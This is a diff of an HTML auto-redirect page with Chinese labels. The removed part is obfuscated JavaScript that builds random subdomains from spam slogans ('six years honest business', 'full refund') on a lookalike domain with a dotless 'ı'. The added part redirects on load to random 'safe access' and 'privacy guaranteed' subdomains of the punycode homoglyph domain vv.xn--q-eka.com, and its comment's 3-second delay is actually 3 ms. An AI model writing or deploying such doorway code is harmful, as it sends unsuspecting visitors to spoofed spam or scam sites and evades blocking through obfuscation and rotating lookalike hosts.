@@ -1,23 +1,45 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
- <title>跳转页面</title>
-<script>
-var _0x3e5f=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x5F\u5B98\u65B9\u7F51\u5740\u7262\u8BB0\x77\x77\x77\x5F\x6D\x69\x79\x61\x6F\x5F\x69\x6E","\x5F\x36\u5E74\u8BDA\u4FE1\u7ECF\u8425","\x5F\u4EA7\u54C1\u5B9E\u62CD\u6548\u679C\u4FDD\u8BC1","\x5F\u4EA7\u54C1\u5B9E\u62CD\u65E0\u6548\u5168\u989D\u9000\u6B3E","\x5F\u6C38\u4E45\u8054\u7CFB\u6211\u4EEC\x34\x37\x34\x79\x5F\x63\x6F\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x2E\x71\x71\x2E\u0131\x71\x2E\x63\x6F\x6D","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E"];function generateRandomCharacters(){var _0x722cx2=_0x3e5f[0];var _0x722cx3=_0x3e5f[1];for(var _0x722cx4=0;_0x722cx4< 5;_0x722cx4++){_0x722cx2+= _0x722cx3[_0x3e5f[5]](Math[_0x3e5f[4]](Math[_0x3e5f[2]]()* _0x722cx3[_0x3e5f[3]]))};return _0x722cx2}function getRandomPresetVariable(){var _0x722cx6=[_0x3e5f[6],_0x3e5f[7],_0x3e5f[8],_0x3e5f[9],_0x3e5f[9],_0x3e5f[10]];return _0x722cx6[Math[_0x3e5f[4]](Math[_0x3e5f[2]]()* _0x722cx6[_0x3e5f[3]])]}function redirectToURL(){var _0x722cx8=generateRandomCharacters();var _0x722cx9=getRandomPresetVariable();var _0x722cxa=_0x3e5f[11]+ _0x722cx8+ _0x722cx9+ _0x3e5f[12];window[_0x3e5f[14]][_0x3e5f[13]]= _0x722cxa}
-</script>
-	  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-145418913-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+  <meta charset="UTF-8">
+  <title>自动跳转页面</title>
+  <script>
+    function redirectToRandomURL() {
+      // 定义可选的安全访问选项
+      var options = [
+        "安全访问",
+        "隐私保证",
+        "安全加密",
+        "安全网站"
+     
+      ];
 
-  gtag('config', 'UA-145418913-1');
-</script>
-	
+      // 从选项中随机选择一个
+      var randomOption = options[Math.floor(Math.random() * options.length)];
+
+      // 定义特殊字符
+      var specialCharacter = ".";
+
+      // 定义域名
+      var domain = "vv.xn--q-eka.com";
+
+      // 构造完整的跳转URL
+      var redirectURL = "http://" + randomOption + specialCharacter + domain;
+
+      // 延迟一定时间后执行跳转
+      setTimeout(function() {
+        window.location.href = redirectURL;
+      }, 3); // 延迟3秒钟
+    }
+
+    // 页面加载后自动触发跳转
+    window.onload = redirectToRandomURL;
+  </script>
+  
+  
+    <button onclick="redirectToRandomURL()">点击跳转</button>
 </head>
-<body onload="redirectToURL()">
+<body>
+
 </body>
 </html>
